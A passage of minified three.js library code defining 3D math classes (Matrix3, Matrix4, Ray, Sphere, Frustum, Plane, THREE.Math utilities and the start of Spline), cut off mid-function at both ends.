e=t[1],t[1]=t[3],t[3]=e,e=t[2],t[2]=t[6],t[6]=e,e=t[5],t[5]=t[7],t[7]=e,this},flattenToArrayOffset:function(e,t){var r=this.elements;return e[t]=r[0],e[t+1]=r[1],e[t+2]=r[2],e[t+3]=r[3],e[t+4]=r[4],e[t+5]=r[5],e[t+6]=r[6],e[t+7]=r[7],e[t+8]=r[8],e},getNormalMatrix:function(e){return this.getInverse(e).transpose(),this},transposeIntoArray:function(e){var t=this.elements;return e[0]=t[0],e[1]=t[3],e[2]=t[6],e[3]=t[1],e[4]=t[4],e[5]=t[7],e[6]=t[2],e[7]=t[5],e[8]=t[8],this},fromArray:function(e){return this.elements.set(e),this},toArray:function(){var e=this.elements;return[e[0],e[1],e[2],e[3],e[4],e[5],e[6],e[7],e[8]]},clone:function(){return(new THREE.Matrix3).fromArray(this.elements)}},THREE.Matrix4=function(){this.elements=new Float32Array([1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]),arguments.length>0&&THREE.error("THREE.Matrix4: the constructor no longer reads arguments. use .set() instead.")},THREE.Matrix4.prototype={constructor:THREE.Matrix4,set:function(e,t,r,i,n,a,o,s,h,l,c,u,E,f,p,d){var m=this.elements;return m[0]=e,m[4]=t,m[8]=r,m[12]=i,m[1]=n,m[5]=a,m[9]=o,m[13]=s,m[2]=h,m[6]=l,m[10]=c,m[14]=u,m[3]=E,m[7]=f,m[11]=p,m[15]=d,this},identity:function(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this},copy:function(e){return this.elements.set(e.elements),this},extractPosition:function(e){return THREE.warn("THREE.Matrix4: .extractPosition() has been renamed to .copyPosition()."),this.copyPosition(e)},copyPosition:function(e){var t=this.elements,r=e.elements;return t[12]=r[12],t[13]=r[13],t[14]=r[14],this},extractBasis:function(e,t,r){var i=this.elements;return e.set(i[0],i[1],i[2]),t.set(i[4],i[5],i[6]),r.set(i[8],i[9],i[10]),this},makeBasis:function(e,t,r){return this.set(e.x,t.x,r.x,0,e.y,t.y,r.y,0,e.z,t.z,r.z,0,0,0,0,1),this},extractRotation:function(){var e=new THREE.Vector3;return function(t){var r=this.elements,i=t.elements,n=1/e.set(i[0],i[1],i[2]).length(),a=1/e.set(i[4],i[5],i[6]).length(),o=1/e.set(i[8],i[9],i[10]).length();return r[0]=i[0]*n,r[1]=i[1]*n,r[2]=i[2]*n,r[4]=i[4]*a,r[5]=i[5]*a,r[6]=i[6]*a,r[8]=i[8]*o,r[9]=i[9]*o,r[10]=i[10]*o,this}}(),makeRotationFromEuler:function(e){e instanceof THREE.Euler==!1&&THREE.error("THREE.Matrix: .makeRotationFromEuler() now expects a Euler rotation rather than a Vector3 and order.");var t=this.elements,r=e.x,i=e.y,n=e.z,a=Math.cos(r),o=Math.sin(r),s=Math.cos(i),h=Math.sin(i),l=Math.cos(n),c=Math.sin(n);if("XYZ"===e.order){var u=a*l,E=a*c,f=o*l,p=o*c;t[0]=s*l,t[4]=-s*c,t[8]=h,t[1]=E+f*h,t[5]=u-p*h,t[9]=-o*s,t[2]=p-u*h,t[6]=f+E*h,t[10]=a*s}else if("YXZ"===e.order){var d=s*l,m=s*c,T=h*l,g=h*c;t[0]=d+g*o,t[4]=T*o-m,t[8]=a*h,t[1]=a*c,t[5]=a*l,t[9]=-o,t[2]=m*o-T,t[6]=g+d*o,t[10]=a*s}else if("ZXY"===e.order){var d=s*l,m=s*c,T=h*l,g=h*c;t[0]=d-g*o,t[4]=-a*c,t[8]=T+m*o,t[1]=m+T*o,t[5]=a*l,t[9]=g-d*o,t[2]=-a*h,t[6]=o,t[10]=a*s}else if("ZYX"===e.order){var u=a*l,E=a*c,f=o*l,p=o*c;t[0]=s*l,t[4]=f*h-E,t[8]=u*h+p,t[1]=s*c,t[5]=p*h+u,t[9]=E*h-f,t[2]=-h,t[6]=o*s,t[10]=a*s}else if("YZX"===e.order){var v=a*s,R=a*h,y=o*s,H=o*h;t[0]=s*l,t[4]=H-v*c,t[8]=y*c+R,t[1]=c,t[5]=a*l,t[9]=-o*l,t[2]=-h*l,t[6]=R*c+y,t[10]=v-H*c}else if("XZY"===e.order){var v=a*s,R=a*h,y=o*s,H=o*h;t[0]=s*l,t[4]=-c,t[8]=h*l,t[1]=v*c+H,t[5]=a*l,t[9]=R*c-y,t[2]=y*c-R,t[6]=o*l,t[10]=H*c+v}return t[3]=0,t[7]=0,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,this},setRotationFromQuaternion:function(e){return THREE.warn("THREE.Matrix4: .setRotationFromQuaternion() has been renamed to .makeRotationFromQuaternion()."),this.makeRotationFromQuaternion(e)},makeRotationFromQuaternion:function(e){var t=this.elements,r=e.x,i=e.y,n=e.z,a=e.w,o=r+r,s=i+i,h=n+n,l=r*o,c=r*s,u=r*h,E=i*s,f=i*h,p=n*h,d=a*o,m=a*s,T=a*h;return t[0]=1-(E+p),t[4]=c-T,t[8]=u+m,t[1]=c+T,t[5]=1-(l+p),t[9]=f-d,t[2]=u-m,t[6]=f+d,t[10]=1-(l+E),t[3]=0,t[7]=0,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,this},lookAt:function(){var e=new THREE.Vector3,t=new THREE.Vector3,r=new THREE.Vector3;return function(i,n,a){var o=this.elements;return r.subVectors(i,n).normalize(),0===r.length()&&(r.z=1),e.crossVectors(a,r).normalize(),0===e.length()&&(r.x+=1e-4,e.crossVectors(a,r).normalize()),t.crossVectors(r,e),o[0]=e.x,o[4]=t.x,o[8]=r.x,o[1]=e.y,o[5]=t.y,o[9]=r.y,o[2]=e.z,o[6]=t.z,o[10]=r.z,this}}(),multiply:function(e,t){return void 0!==t?(THREE.warn("THREE.Matrix4: .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead."),this.multiplyMatrices(e,t)):this.multiplyMatrices(this,e)},multiplyMatrices:function(e,t){var r=e.elements,i=t.elements,n=this.elements,a=r[0],o=r[4],s=r[8],h=r[12],l=r[1],c=r[5],u=r[9],E=r[13],f=r[2],p=r[6],d=r[10],m=r[14],T=r[3],g=r[7],v=r[11],R=r[15],y=i[0],H=i[4],x=i[8],b=i[12],_=i[1],w=i[5],M=i[9],S=i[13],A=i[2],C=i[6],L=i[10],P=i[14],F=i[3],U=i[7],B=i[11],D=i[15];return n[0]=a*y+o*_+s*A+h*F,n[4]=a*H+o*w+s*C+h*U,n[8]=a*x+o*M+s*L+h*B,n[12]=a*b+o*S+s*P+h*D,n[1]=l*y+c*_+u*A+E*F,n[5]=l*H+c*w+u*C+E*U,n[9]=l*x+c*M+u*L+E*B,n[13]=l*b+c*S+u*P+E*D,n[2]=f*y+p*_+d*A+m*F,n[6]=f*H+p*w+d*C+m*U,n[10]=f*x+p*M+d*L+m*B,n[14]=f*b+p*S+d*P+m*D,n[3]=T*y+g*_+v*A+R*F,n[7]=T*H+g*w+v*C+R*U,n[11]=T*x+g*M+v*L+R*B,n[15]=T*b+g*S+v*P+R*D,this},multiplyToArray:function(e,t,r){var i=this.elements;return this.multiplyMatrices(e,t),r[0]=i[0],r[1]=i[1],r[2]=i[2],r[3]=i[3],r[4]=i[4],r[5]=i[5],r[6]=i[6],r[7]=i[7],r[8]=i[8],r[9]=i[9],r[10]=i[10],r[11]=i[11],r[12]=i[12],r[13]=i[13],r[14]=i[14],r[15]=i[15],this},multiplyScalar:function(e){var t=this.elements;return t[0]*=e,t[4]*=e,t[8]*=e,t[12]*=e,t[1]*=e,t[5]*=e,t[9]*=e,t[13]*=e,t[2]*=e,t[6]*=e,t[10]*=e,t[14]*=e,t[3]*=e,t[7]*=e,t[11]*=e,t[15]*=e,this},multiplyVector3:function(e){return THREE.warn("THREE.Matrix4: .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) or vector.applyProjection( matrix ) instead."),e.applyProjection(this)},multiplyVector4:function(e){return THREE.warn("THREE.Matrix4: .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead."),e.applyMatrix4(this)},multiplyVector3Array:function(e){return THREE.warn("THREE.Matrix4: .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead."),this.applyToVector3Array(e)},applyToVector3Array:function(){var e=new THREE.Vector3;return function(t,r,i){void 0===r&&(r=0),void 0===i&&(i=t.length);for(var n=0,a=r;i>n;n+=3,a+=3)e.x=t[a],e.y=t[a+1],e.z=t[a+2],e.applyMatrix4(this),t[a]=e.x,t[a+1]=e.y,t[a+2]=e.z;return t}}(),rotateAxis:function(e){THREE.warn("THREE.Matrix4: .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead."),e.transformDirection(this)},crossVector:function(e){return THREE.warn("THREE.Matrix4: .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead."),e.applyMatrix4(this)},determinant:function(){var e=this.elements,t=e[0],r=e[4],i=e[8],n=e[12],a=e[1],o=e[5],s=e[9],h=e[13],l=e[2],c=e[6],u=e[10],E=e[14],f=e[3],p=e[7],d=e[11],m=e[15];return f*(+n*s*c-i*h*c-n*o*u+r*h*u+i*o*E-r*s*E)+p*(+t*s*E-t*h*u+n*a*u-i*a*E+i*h*l-n*s*l)+d*(+t*h*c-t*o*E-n*a*c+r*a*E+n*o*l-r*h*l)+m*(-i*o*l-t*s*c+t*o*u+i*a*c-r*a*u+r*s*l)},transpose:function(){var e,t=this.elements;return e=t[1],t[1]=t[4],t[4]=e,e=t[2],t[2]=t[8],t[8]=e,e=t[6],t[6]=t[9],t[9]=e,e=t[3],t[3]=t[12],t[12]=e,e=t[7],t[7]=t[13],t[13]=e,e=t[11],t[11]=t[14],t[14]=e,this},flattenToArrayOffset:function(e,t){var r=this.elements;return e[t]=r[0],e[t+1]=r[1],e[t+2]=r[2],e[t+3]=r[3],e[t+4]=r[4],e[t+5]=r[5],e[t+6]=r[6],e[t+7]=r[7],e[t+8]=r[8],e[t+9]=r[9],e[t+10]=r[10],e[t+11]=r[11],e[t+12]=r[12],e[t+13]=r[13],e[t+14]=r[14],e[t+15]=r[15],e},getPosition:function(){var e=new THREE.Vector3;return function(){THREE.warn("THREE.Matrix4: .getPosition() has been removed. Use Vector3.setFromMatrixPosition( matrix ) instead.");var t=this.elements;return e.set(t[12],t[13],t[14])}}(),setPosition:function(e){var t=this.elements;return t[12]=e.x,t[13]=e.y,t[14]=e.z,this},getInverse:function(e,t){var r=this.elements,i=e.elements,n=i[0],a=i[4],o=i[8],s=i[12],h=i[1],l=i[5],c=i[9],u=i[13],E=i[2],f=i[6],p=i[10],d=i[14],m=i[3],T=i[7],g=i[11],v=i[15];r[0]=c*d*T-u*p*T+u*f*g-l*d*g-c*f*v+l*p*v,r[4]=s*p*T-o*d*T-s*f*g+a*d*g+o*f*v-a*p*v,r[8]=o*u*T-s*c*T+s*l*g-a*u*g-o*l*v+a*c*v,r[12]=s*c*f-o*u*f-s*l*p+a*u*p+o*l*d-a*c*d,r[1]=u*p*m-c*d*m-u*E*g+h*d*g+c*E*v-h*p*v,r[5]=o*d*m-s*p*m+s*E*g-n*d*g-o*E*v+n*p*v,r[9]=s*c*m-o*u*m-s*h*g+n*u*g+o*h*v-n*c*v,r[13]=o*u*E-s*c*E+s*h*p-n*u*p-o*h*d+n*c*d,r[2]=l*d*m-u*f*m+u*E*T-h*d*T-l*E*v+h*f*v,r[6]=s*f*m-a*d*m-s*E*T+n*d*T+a*E*v-n*f*v,r[10]=a*u*m-s*l*m+s*h*T-n*u*T-a*h*v+n*l*v,r[14]=s*l*E-a*u*E-s*h*f+n*u*f+a*h*d-n*l*d,r[3]=c*f*m-l*p*m-c*E*T+h*p*T+l*E*g-h*f*g,r[7]=a*p*m-o*f*m+o*E*T-n*p*T-a*E*g+n*f*g,r[11]=o*l*m-a*c*m-o*h*T+n*c*T+a*h*g-n*l*g,r[15]=a*c*E-o*l*E+o*h*f-n*c*f-a*h*p+n*l*p;var R=n*r[0]+h*r[4]+E*r[8]+m*r[12];if(0==R){var y="THREE.Matrix4.getInverse(): can't invert matrix, determinant is 0";if(t)throw new Error(y);return THREE.warn(y),this.identity(),this}return this.multiplyScalar(1/R),this},translate:function(e){THREE.error("THREE.Matrix4: .translate() has been removed.")},rotateX:function(e){THREE.error("THREE.Matrix4: .rotateX() has been removed.")},rotateY:function(e){THREE.error("THREE.Matrix4: .rotateY() has been removed.")},rotateZ:function(e){THREE.error("THREE.Matrix4: .rotateZ() has been removed.")},rotateByAxis:function(e,t){THREE.error("THREE.Matrix4: .rotateByAxis() has been removed.")},scale:function(e){var t=this.elements,r=e.x,i=e.y,n=e.z;return t[0]*=r,t[4]*=i,t[8]*=n,t[1]*=r,t[5]*=i,t[9]*=n,t[2]*=r,t[6]*=i,t[10]*=n,t[3]*=r,t[7]*=i,t[11]*=n,this},getMaxScaleOnAxis:function(){var e=this.elements,t=e[0]*e[0]+e[1]*e[1]+e[2]*e[2],r=e[4]*e[4]+e[5]*e[5]+e[6]*e[6],i=e[8]*e[8]+e[9]*e[9]+e[10]*e[10];return Math.sqrt(Math.max(t,Math.max(r,i)))},makeTranslation:function(e,t,r){return this.set(1,0,0,e,0,1,0,t,0,0,1,r,0,0,0,1),this},makeRotationX:function(e){var t=Math.cos(e),r=Math.sin(e);return this.set(1,0,0,0,0,t,-r,0,0,r,t,0,0,0,0,1),this},makeRotationY:function(e){var t=Math.cos(e),r=Math.sin(e);return this.set(t,0,r,0,0,1,0,0,-r,0,t,0,0,0,0,1),this},makeRotationZ:function(e){var t=Math.cos(e),r=Math.sin(e);return this.set(t,-r,0,0,r,t,0,0,0,0,1,0,0,0,0,1),this},makeRotationAxis:function(e,t){var r=Math.cos(t),i=Math.sin(t),n=1-r,a=e.x,o=e.y,s=e.z,h=n*a,l=n*o;return this.set(h*a+r,h*o-i*s,h*s+i*o,0,h*o+i*s,l*o+r,l*s-i*a,0,h*s-i*o,l*s+i*a,n*s*s+r,0,0,0,0,1),this},makeScale:function(e,t,r){return this.set(e,0,0,0,0,t,0,0,0,0,r,0,0,0,0,1),this},compose:function(e,t,r){return this.makeRotationFromQuaternion(t),this.scale(r),this.setPosition(e),this},decompose:function(){var e=new THREE.Vector3,t=new THREE.Matrix4;return function(r,i,n){var a=this.elements,o=e.set(a[0],a[1],a[2]).length(),s=e.set(a[4],a[5],a[6]).length(),h=e.set(a[8],a[9],a[10]).length(),l=this.determinant();0>l&&(o=-o),r.x=a[12],r.y=a[13],r.z=a[14],t.elements.set(this.elements);var c=1/o,u=1/s,E=1/h;return t.elements[0]*=c,t.elements[1]*=c,t.elements[2]*=c,t.elements[4]*=u,t.elements[5]*=u,t.elements[6]*=u,t.elements[8]*=E,t.elements[9]*=E,t.elements[10]*=E,i.setFromRotationMatrix(t),n.x=o,n.y=s,n.z=h,this}}(),makeFrustum:function(e,t,r,i,n,a){var o=this.elements,s=2*n/(t-e),h=2*n/(i-r),l=(t+e)/(t-e),c=(i+r)/(i-r),u=-(a+n)/(a-n),E=-2*a*n/(a-n);return o[0]=s,o[4]=0,o[8]=l,o[12]=0,o[1]=0,o[5]=h,o[9]=c,o[13]=0,o[2]=0,o[6]=0,o[10]=u,o[14]=E,o[3]=0,o[7]=0,o[11]=-1,o[15]=0,this},makePerspective:function(e,t,r,i){var n=r*Math.tan(THREE.Math.degToRad(.5*e)),a=-n,o=a*t,s=n*t;return this.makeFrustum(o,s,a,n,r,i)},makeOrthographic:function(e,t,r,i,n,a){var o=this.elements,s=t-e,h=r-i,l=a-n,c=(t+e)/s,u=(r+i)/h,E=(a+n)/l;return o[0]=2/s,o[4]=0,o[8]=0,o[12]=-c,o[1]=0,o[5]=2/h,o[9]=0,o[13]=-u,o[2]=0,o[6]=0,o[10]=-2/l,o[14]=-E,o[3]=0,o[7]=0,o[11]=0,o[15]=1,this},fromArray:function(e){return this.elements.set(e),this},toArray:function(){var e=this.elements;return[e[0],e[1],e[2],e[3],e[4],e[5],e[6],e[7],e[8],e[9],e[10],e[11],e[12],e[13],e[14],e[15]]},clone:function(){return(new THREE.Matrix4).fromArray(this.elements)}},THREE.Ray=function(e,t){this.origin=void 0!==e?e:new THREE.Vector3,this.direction=void 0!==t?t:new THREE.Vector3},THREE.Ray.prototype={constructor:THREE.Ray,set:function(e,t){return this.origin.copy(e),this.direction.copy(t),this},copy:function(e){return this.origin.copy(e.origin),this.direction.copy(e.direction),this},at:function(e,t){var r=t||new THREE.Vector3;return r.copy(this.direction).multiplyScalar(e).add(this.origin)},recast:function(){var e=new THREE.Vector3;return function(t){return this.origin.copy(this.at(t,e)),this}}(),closestPointToPoint:function(e,t){var r=t||new THREE.Vector3;r.subVectors(e,this.origin);var i=r.dot(this.direction);return 0>i?r.copy(this.origin):r.copy(this.direction).multiplyScalar(i).add(this.origin)},distanceToPoint:function(){var e=new THREE.Vector3;return function(t){var r=e.subVectors(t,this.origin).dot(this.direction);return 0>r?this.origin.distanceTo(t):(e.copy(this.direction).multiplyScalar(r).add(this.origin),e.distanceTo(t))}}(),distanceSqToSegment:function(){var e=new THREE.Vector3,t=new THREE.Vector3,r=new THREE.Vector3;return function(i,n,a,o){e.copy(i).add(n).multiplyScalar(.5),t.copy(n).sub(i).normalize(),r.copy(this.origin).sub(e);var s,h,l,c,u=.5*i.distanceTo(n),E=-this.direction.dot(t),f=r.dot(this.direction),p=-r.dot(t),d=r.lengthSq(),m=Math.abs(1-E*E);if(m>0)if(s=E*p-f,h=E*f-p,c=u*m,s>=0)if(h>=-c)if(c>=h){var T=1/m;s*=T,h*=T,l=s*(s+E*h+2*f)+h*(E*s+h+2*p)+d}else h=u,s=Math.max(0,-(E*h+f)),l=-s*s+h*(h+2*p)+d;else h=-u,s=Math.max(0,-(E*h+f)),l=-s*s+h*(h+2*p)+d;else-c>=h?(s=Math.max(0,-(-E*u+f)),h=s>0?-u:Math.min(Math.max(-u,-p),u),l=-s*s+h*(h+2*p)+d):c>=h?(s=0,h=Math.min(Math.max(-u,-p),u),l=h*(h+2*p)+d):(s=Math.max(0,-(E*u+f)),h=s>0?u:Math.min(Math.max(-u,-p),u),l=-s*s+h*(h+2*p)+d);else h=E>0?-u:u,s=Math.max(0,-(E*h+f)),l=-s*s+h*(h+2*p)+d;return a&&a.copy(this.direction).multiplyScalar(s).add(this.origin),o&&o.copy(t).multiplyScalar(h).add(e),l}}(),isIntersectionSphere:function(e){return this.distanceToPoint(e.center)<=e.radius},intersectSphere:function(){var e=new THREE.Vector3;return function(t,r){e.subVectors(t.center,this.origin);var i=e.dot(this.direction),n=e.dot(e)-i*i,a=t.radius*t.radius;if(n>a)return null;var o=Math.sqrt(a-n),s=i-o,h=i+o;return 0>s&&0>h?null:0>s?this.at(h,r):this.at(s,r)}}(),isIntersectionPlane:function(e){var t=e.distanceToPoint(this.origin);if(0===t)return!0;var r=e.normal.dot(this.direction);return 0>r*t?!0:!1},distanceToPlane:function(e){var t=e.normal.dot(this.direction);if(0==t)return 0==e.distanceToPoint(this.origin)?0:null;var r=-(this.origin.dot(e.normal)+e.constant)/t;return r>=0?r:null},intersectPlane:function(e,t){var r=this.distanceToPlane(e);return null===r?null:this.at(r,t)},isIntersectionBox:function(){var e=new THREE.Vector3;return function(t){return null!==this.intersectBox(t,e)}}(),intersectBox:function(e,t){var r,i,n,a,o,s,h=1/this.direction.x,l=1/this.direction.y,c=1/this.direction.z,u=this.origin;return h>=0?(r=(e.min.x-u.x)*h,i=(e.max.x-u.x)*h):(r=(e.max.x-u.x)*h,i=(e.min.x-u.x)*h),l>=0?(n=(e.min.y-u.y)*l,a=(e.max.y-u.y)*l):(n=(e.max.y-u.y)*l,a=(e.min.y-u.y)*l),r>a||n>i?null:((n>r||r!==r)&&(r=n),(i>a||i!==i)&&(i=a),c>=0?(o=(e.min.z-u.z)*c,s=(e.max.z-u.z)*c):(o=(e.max.z-u.z)*c,s=(e.min.z-u.z)*c),r>s||o>i?null:((o>r||r!==r)&&(r=o),(i>s||i!==i)&&(i=s),0>i?null:this.at(r>=0?r:i,t)))},intersectTriangle:function(){var e=new THREE.Vector3,t=new THREE.Vector3,r=new THREE.Vector3,i=new THREE.Vector3;return function(n,a,o,s,h){t.subVectors(a,n),r.subVectors(o,n),i.crossVectors(t,r);var l,c=this.direction.dot(i);if(c>0){if(s)return null;l=1}else{if(!(0>c))return null;l=-1,c=-c}e.subVectors(this.origin,n);var u=l*this.direction.dot(r.crossVectors(e,r));if(0>u)return null;var E=l*this.direction.dot(t.cross(e));if(0>E)return null;if(u+E>c)return null;var f=-l*e.dot(i);return 0>f?null:this.at(f/c,h)}}(),applyMatrix4:function(e){return this.direction.add(this.origin).applyMatrix4(e),this.origin.applyMatrix4(e),this.direction.sub(this.origin),this.direction.normalize(),this},equals:function(e){return e.origin.equals(this.origin)&&e.direction.equals(this.direction)},clone:function(){return(new THREE.Ray).copy(this)}},THREE.Sphere=function(e,t){this.center=void 0!==e?e:new THREE.Vector3,this.radius=void 0!==t?t:0},THREE.Sphere.prototype={constructor:THREE.Sphere,set:function(e,t){return this.center.copy(e),this.radius=t,this},setFromPoints:function(){var e=new THREE.Box3;return function(t,r){var i=this.center;void 0!==r?i.copy(r):e.setFromPoints(t).center(i);for(var n=0,a=0,o=t.length;o>a;a++)n=Math.max(n,i.distanceToSquared(t[a]));return this.radius=Math.sqrt(n),this}}(),copy:function(e){return this.center.copy(e.center),this.radius=e.radius,this},empty:function(){return this.radius<=0},containsPoint:function(e){return e.distanceToSquared(this.center)<=this.radius*this.radius},distanceToPoint:function(e){return e.distanceTo(this.center)-this.radius},intersectsSphere:function(e){var t=this.radius+e.radius;return e.center.distanceToSquared(this.center)<=t*t},clampPoint:function(e,t){var r=this.center.distanceToSquared(e),i=t||new THREE.Vector3;return i.copy(e),r>this.radius*this.radius&&(i.sub(this.center).normalize(),i.multiplyScalar(this.radius).add(this.center)),i},getBoundingBox:function(e){var t=e||new THREE.Box3;return t.set(this.center,this.center),t.expandByScalar(this.radius),t},applyMatrix4:function(e){return this.center.applyMatrix4(e),this.radius=this.radius*e.getMaxScaleOnAxis(),this},translate:function(e){return this.center.add(e),this},equals:function(e){return e.center.equals(this.center)&&e.radius===this.radius},clone:function(){return(new THREE.Sphere).copy(this)}},THREE.Frustum=function(e,t,r,i,n,a){this.planes=[void 0!==e?e:new THREE.Plane,void 0!==t?t:new THREE.Plane,void 0!==r?r:new THREE.Plane,void 0!==i?i:new THREE.Plane,void 0!==n?n:new THREE.Plane,void 0!==a?a:new THREE.Plane]},THREE.Frustum.prototype={constructor:THREE.Frustum,set:function(e,t,r,i,n,a){var o=this.planes;return o[0].copy(e),o[1].copy(t),o[2].copy(r),o[3].copy(i),o[4].copy(n),o[5].copy(a),this},copy:function(e){for(var t=this.planes,r=0;6>r;r++)t[r].copy(e.planes[r]);return this},setFromMatrix:function(e){var t=this.planes,r=e.elements,i=r[0],n=r[1],a=r[2],o=r[3],s=r[4],h=r[5],l=r[6],c=r[7],u=r[8],E=r[9],f=r[10],p=r[11],d=r[12],m=r[13],T=r[14],g=r[15];return t[0].setComponents(o-i,c-s,p-u,g-d).normalize(),t[1].setComponents(o+i,c+s,p+u,g+d).normalize(),t[2].setComponents(o+n,c+h,p+E,g+m).normalize(),t[3].setComponents(o-n,c-h,p-E,g-m).normalize(),t[4].setComponents(o-a,c-l,p-f,g-T).normalize(),t[5].setComponents(o+a,c+l,p+f,g+T).normalize(),this},intersectsObject:function(){var e=new THREE.Sphere;return function(t){var r=t.geometry;return null===r.boundingSphere&&r.computeBoundingSphere(),e.copy(r.boundingSphere),e.applyMatrix4(t.matrixWorld),this.intersectsSphere(e)}}(),intersectsSphere:function(e){for(var t=this.planes,r=e.center,i=-e.radius,n=0;6>n;n++){var a=t[n].distanceToPoint(r);if(i>a)return!1}return!0},intersectsBox:function(){var e=new THREE.Vector3,t=new THREE.Vector3;return function(r){for(var i=this.planes,n=0;6>n;n++){var a=i[n];e.x=a.normal.x>0?r.min.x:r.max.x,t.x=a.normal.x>0?r.max.x:r.min.x,e.y=a.normal.y>0?r.min.y:r.max.y,t.y=a.normal.y>0?r.max.y:r.min.y,e.z=a.normal.z>0?r.min.z:r.max.z,t.z=a.normal.z>0?r.max.z:r.min.z;var o=a.distanceToPoint(e),s=a.distanceToPoint(t);if(0>o&&0>s)return!1}return!0}}(),containsPoint:function(e){for(var t=this.planes,r=0;6>r;r++)if(t[r].distanceToPoint(e)<0)return!1;return!0},clone:function(){return(new THREE.Frustum).copy(this);
}},THREE.Plane=function(e,t){this.normal=void 0!==e?e:new THREE.Vector3(1,0,0),this.constant=void 0!==t?t:0},THREE.Plane.prototype={constructor:THREE.Plane,set:function(e,t){return this.normal.copy(e),this.constant=t,this},setComponents:function(e,t,r,i){return this.normal.set(e,t,r),this.constant=i,this},setFromNormalAndCoplanarPoint:function(e,t){return this.normal.copy(e),this.constant=-t.dot(this.normal),this},setFromCoplanarPoints:function(){var e=new THREE.Vector3,t=new THREE.Vector3;return function(r,i,n){var a=e.subVectors(n,i).cross(t.subVectors(r,i)).normalize();return this.setFromNormalAndCoplanarPoint(a,r),this}}(),copy:function(e){return this.normal.copy(e.normal),this.constant=e.constant,this},normalize:function(){var e=1/this.normal.length();return this.normal.multiplyScalar(e),this.constant*=e,this},negate:function(){return this.constant*=-1,this.normal.negate(),this},distanceToPoint:function(e){return this.normal.dot(e)+this.constant},distanceToSphere:function(e){return this.distanceToPoint(e.center)-e.radius},projectPoint:function(e,t){return this.orthoPoint(e,t).sub(e).negate()},orthoPoint:function(e,t){var r=this.distanceToPoint(e),i=t||new THREE.Vector3;return i.copy(this.normal).multiplyScalar(r)},isIntersectionLine:function(e){var t=this.distanceToPoint(e.start),r=this.distanceToPoint(e.end);return 0>t&&r>0||0>r&&t>0},intersectLine:function(){var e=new THREE.Vector3;return function(t,r){var i=r||new THREE.Vector3,n=t.delta(e),a=this.normal.dot(n);if(0==a)return 0==this.distanceToPoint(t.start)?i.copy(t.start):void 0;var o=-(t.start.dot(this.normal)+this.constant)/a;return 0>o||o>1?void 0:i.copy(n).multiplyScalar(o).add(t.start)}}(),coplanarPoint:function(e){var t=e||new THREE.Vector3;return t.copy(this.normal).multiplyScalar(-this.constant)},applyMatrix4:function(){var e=new THREE.Vector3,t=new THREE.Vector3,r=new THREE.Matrix3;return function(i,n){var a=n||r.getNormalMatrix(i),o=e.copy(this.normal).applyMatrix3(a),s=this.coplanarPoint(t);return s.applyMatrix4(i),this.setFromNormalAndCoplanarPoint(o,s),this}}(),translate:function(e){return this.constant=this.constant-e.dot(this.normal),this},equals:function(e){return e.normal.equals(this.normal)&&e.constant==this.constant},clone:function(){return(new THREE.Plane).copy(this)}},THREE.Math={generateUUID:function(){var e,t="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split(""),r=new Array(36),i=0;return function(){for(var n=0;36>n;n++)8==n||13==n||18==n||23==n?r[n]="-":14==n?r[n]="4":(2>=i&&(i=33554432+16777216*Math.random()|0),e=15&i,i>>=4,r[n]=t[19==n?3&e|8:e]);return r.join("")}}(),clamp:function(e,t,r){return t>e?t:e>r?r:e},clampBottom:function(e,t){return t>e?t:e},mapLinear:function(e,t,r,i,n){return i+(e-t)*(n-i)/(r-t)},smoothstep:function(e,t,r){return t>=e?0:e>=r?1:(e=(e-t)/(r-t),e*e*(3-2*e))},smootherstep:function(e,t,r){return t>=e?0:e>=r?1:(e=(e-t)/(r-t),e*e*e*(e*(6*e-15)+10))},random16:function(){return(65280*Math.random()+255*Math.random())/65535},randInt:function(e,t){return Math.floor(this.randFloat(e,t))},randFloat:function(e,t){return e+Math.random()*(t-e)},randFloatSpread:function(e){return e*(.5-Math.random())},degToRad:function(){var e=Math.PI/180;return function(t){return t*e}}(),radToDeg:function(){var e=180/Math.PI;return function(t){return t*e}}(),isPowerOfTwo:function(e){return 0===(e&e-1)&&0!==e},nextPowerOfTwo:function(e){return e--,e|=e>>1,e|=e>>2,e|=e>>4,e|=e>>8,e|=e>>16,e++,e}},THREE.Spline=function(e){function t(e,t,r,i,n,a,o){var s=.5*(r-e),h=.5*(i-t);return(2*(t-r)+s+h)*o+(-3*(t-r)-2*s-h)*a+s*n+t}this.points=e;var r,i,n,a,o,s,h,l,c,u=[],E={x:0,y:0,z:0};this.initFromArray=function(e){this.points=[];for(var t=0;t<e.length;t++)this.points[t]={x:e[t][0],y:e[t][1],z:e[t][2]}},this.getPoint=function(e){return r=(this.points.length-1)*e,i=Math.floor(r),n=r-i,u[0]=0===i?i:i-1,u[1]=i,u[2]=i>this.points.length-2?this.points.length-1:i+1,u[3]=i>this.points.length-3?this.points.length-1:i+2,s=this.points[u[0]],h=this.points[u[1]],l=this.points[u[2]],c=this.points[u[3]],a=n*n,o=n*a,E.x=t(s.x,h.x,l.x,c.x,n,a,o),E.y=t(s.y,h.y,l.y,c.y,n,a,o),E.z=t(s.z,h.z,l.z,c.z,n,a,o),E},this.getControlPointsArray=function(){var e,t,r=this.points.length,i=[];for(e=0;r>e;e++)t=this.points[e],i[e]=[t.x,t.y,t.z];return i},this.getLength=function(e){var t,r,i,n,a=0,o=0,s=0,h=new THREE.Vector3,l=new THREE.Vector3,c=[],u=0;for(c[0]=0,e||(e=100),i=this.points.length*e,h.copy(this.points[0]),t=1;i>t;t++)r=t/i,n=this.getPoint(r),l.copy(n),u+=l.distanceTo(h),h.copy(n),a=(this.points.length-1)*r,o=Math.floor(a),o!=s&&(c[o]=u,s=o);return c[c.length]=u,{chunks:c,total:u}},this.reparametrizeByArcLength=function(e){var t,r,i,n,a,o,s,h,l=[],c=new 